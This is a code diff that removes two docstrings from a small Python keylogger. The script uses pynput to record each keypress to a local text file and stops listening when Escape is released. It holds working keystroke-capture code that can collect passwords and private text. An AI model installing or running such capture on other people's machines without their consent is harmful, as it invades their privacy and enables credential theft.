@@ -1,7 +1,7 @@
 from pynput import keyboard
 
 def on_press(key):
-    """Callback function that gets called whenever a key is pressed."""
+   
     try:
         with open("key_log.txt", "a") as log_file:
             log_file.write(f'{key.char}')
@@ -10,7 +10,7 @@ def on_press(key):
             log_file.write(f'[{key}]')
 
 def on_release(key):
-    """Callback function that gets called whenever a key is released."""
+    
     if key == keyboard.Key.esc:
         # Stop listener by returning False
         return False
